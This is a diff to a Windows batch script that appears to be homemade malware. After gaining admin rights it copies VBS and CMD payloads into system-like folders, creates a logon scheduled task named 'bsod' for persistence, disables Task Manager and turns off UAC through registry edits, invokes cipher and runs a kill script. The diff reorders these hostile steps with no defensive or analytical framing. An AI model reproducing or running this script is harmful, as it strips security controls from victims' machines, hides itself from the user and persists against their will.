@@ -27,9 +27,8 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
-reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
 echo Starting file spread
 copy msg.vbs C:\Wind1
 copy runatstart.cmd C:\Wind1
@@ -37,14 +36,14 @@ copy msg.vbs C:\Wind1
 copy stw.vbs C:\Wind1
 copy e.cmd C:\Wind1
 start echo Setup complete
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /t
+
 copy kill.cmd C:\Wind1
 copy msg.vbs A:\Wind0ws
-copy runatstart.cmd A:\Wind0ws
+copy rnst.cmd A:\Wind0ws
 copy msg.vbs A:\Wind0ws
 copy stw.vbs A:\Wind0ws
 copy e.cmd A:\Wind0ws
-SchTasks /Create  /SC ONLOGON /TN "bsod"  /TR  C:\Wind1\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN "bsod"  /TR  C:\Wind1\rnst.cmd
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
@@ -166,7 +165,7 @@ echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr 
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
-
-
-
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+cipher 
 C:\Wind1\kill.cmd
